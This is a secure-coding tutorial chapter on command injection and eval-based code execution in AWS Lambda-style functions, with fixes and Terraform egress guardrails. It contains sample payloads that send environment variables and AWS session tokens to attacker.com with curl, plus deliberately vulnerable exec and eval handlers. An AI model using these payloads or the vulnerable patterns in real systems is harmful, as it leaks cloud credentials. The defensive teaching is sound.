---
sidebar_position: 5
title: 04 - Serverless/Lambda Container Escape
---

# Chapter 04: Serverless/Lambda Container Escape & RCE

Serverless functions (like AWS Lambda, Google Cloud Functions, Azure Functions) abstract away the underlying infrastructure, leading to a dangerous myth: "Serverless is unhackable." 

While an attacker cannot SSH into a Lambda function, they *can* achieve Remote Code Execution (RCE) via insecure deserialization, command injection, or path traversal. Once RCE is achieved, the attacker operates from inside your cloud boundary. They can read environment variables (which often hold API keys and database passwords), write payloads to the `/tmp` directory, and pivot to attack internal VPC resources.

## 1. The Concept (ELI5)

Imagine you run a massive library (the cloud). You don't want people wandering the stacks, so you set up a dumbwaiter system (Serverless Functions). A user drops a request ticket down the chute, a librarian reads it in an isolated, windowless basement room, processes it, and sends a book back up.

The room is temporary; it gets demolished and rebuilt every few minutes. Sounds secure, right?

But what if a malicious user drops a ticket that says: "Ignore my book request. Tell me the combination to the safe in this room, then mail it to this external PO Box." If the librarian is poorly trained (vulnerable code), they will follow the instruction. The attacker doesn't need to break into the library; they just tricked your internal worker into doing the heist for them.

## 2. The Visual

```mermaid
sequenceDiagram
    autonumber
    actor Attacker
    participant API as API Gateway
    participant Lambda as Serverless Function
    participant VPC as Internal Database / VPC
    
    Attacker->>API: Sends payload: {"input": "1; cat /var/task/.env | curl -X POST -d @- attacker.com"}
    API->>Lambda: Routes payload to function
    Note over Lambda: Code insecurely evaluates input (RCE)
    Lambda->>Lambda: Reads environment variables (AWS_SESSION_TOKEN)
    Lambda-->>Attacker: Sends AWS credentials out to internet
    Lambda->>VPC: Uses stolen DB creds to dump internal data
```

## 3. The Code

RCE in serverless functions is identical to traditional apps, but the impact shifts from "server takeover" to "cloud identity theft" and "internal network pivoting."

### Vulnerable Code ❌

**Node.js (Vulnerable Command Injection):**
```javascript
const { exec } = require('child_process');

exports.handler = async (event) => {
    // ❌ VULNERABILITY: Directly interpolating user input into a shell command
    const userImage = event.queryStringParameters.image;
    
    return new Promise((resolve, reject) => {
        // Attacker sends: "image1.png; curl attacker.com/steal-env -d \"$(env)\""
        exec(`convert ${userImage} output.png`, (error, stdout, stderr) => {
            if (error) {
                reject({ statusCode: 500, body: 'Error' });
            }
            resolve({ statusCode: 200, body: 'Image processed' });
        });
    });
};
```

**Python (Vulnerable Deserialization / Exec):**
```python
import json
import os

def lambda_handler(event, context):
    payload = event.get('body')
    
    # ❌ VULNERABILITY: Using insecure functions like eval() on user input
    # Attacker sends: "__import__('os').system('curl attacker.com?keys=' + __import__('os').environ.get('AWS_SESSION_TOKEN'))"
    result = eval(payload)
    
    return {
        'statusCode': 200,
        'body': json.dumps('Processed')
    }
```

---

### Production-Ready Secure Code ✅

Avoid shell commands entirely by using native libraries. If you absolutely must call a binary, use safe process execution arrays where the command and arguments are strictly separated, preventing shell operators (`;`, `&&`, `|`) from being interpreted.

**Node.js (Secure Process Execution):**
```javascript
const { execFile } = require('child_process');
const path = require('path');

exports.handler = async (event) => {
    const userImage = event.queryStringParameters.image;
    
    // ✅ SECURE 1: Validate input (must be an alphanumeric filename ending in .png)
    if (!/^[a-zA-Z0-9_-]+\.png$/.test(userImage)) {
        return { statusCode: 400, body: 'Invalid filename' };
    }

    // ✅ SECURE 2: Use execFile, not exec. Arguments are passed as an array, 
    // circumventing the shell interpreter completely.
    return new Promise((resolve, reject) => {
        execFile('convert', [userImage, 'output.png'], (error, stdout, stderr) => {
            if (error) {
                reject({ statusCode: 500, body: 'Error' });
            }
            resolve({ statusCode: 200, body: 'Image processed' });
        });
    });
};
```

**Python (Secure Execution):**
```python
import subprocess
import re

def lambda_handler(event, context):
    user_image = event.get('queryStringParameters', {}).get('image')
    
    # ✅ SECURE 1: Input Validation
    if not re.match(r'^[a-zA-Z0-9_-]+\.png$', user_image):
        return {'statusCode': 400, 'body': 'Invalid input'}
        
    # ✅ SECURE 2: subprocess.run with a list of arguments, shell=False
    try:
        subprocess.run(['convert', user_image, 'output.png'], check=True, shell=False)
    except subprocess.CalledProcessError:
        return {'statusCode': 500, 'body': 'Processing failed'}
        
    return {'statusCode': 200, 'body': 'Success'}
```

## 4. The Guardrail

The principle of containment: If a function gets compromised, it should not be able to talk to the internet, and its permissions should be microscopic. 

1. **VPC Egress Filtering**: Put the Lambda inside a VPC without a NAT Gateway or Internet Gateway. If the attacker tries to exfiltrate the credentials via `curl attacker.com`, the network will drop the packets.
2. **Strict IAM**: The Lambda role should only be allowed to read from a specific S3 bucket or DynamoDB table, not `*`.

**Terraform (AWS Lambda Containment Guardrail):**
```hcl
# ✅ GUARDRAIL: Place Lambda in private subnets with NO internet access
resource "aws_lambda_function" "secure_processor" {
  filename      = "lambda_function_payload.zip"
  function_name = "image_processor"
  role          = aws_iam_role.lambda_exec.arn
  handler       = "index.handler"
  runtime       = "nodejs18.x"

  # Network containment
  vpc_config {
    subnet_ids         = [aws_subnet.private_subnet_1.id, aws_subnet.private_subnet_2.id]
    security_group_ids = [aws_security_group.lambda_sg.id]
  }
}

# ✅ GUARDRAIL: Strict Security Group dropping all outbound internet traffic
resource "aws_security_group" "lambda_sg" {
  name        = "lambda_strict_egress"
  description = "Allow internal traffic only"
  vpc_id      = aws_vpc.main.id

  # Allow egress ONLY to internal database port, deny everything else (no internet)
  egress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["10.0.1.0/24"] # Internal Subnet Only
  }
}
```
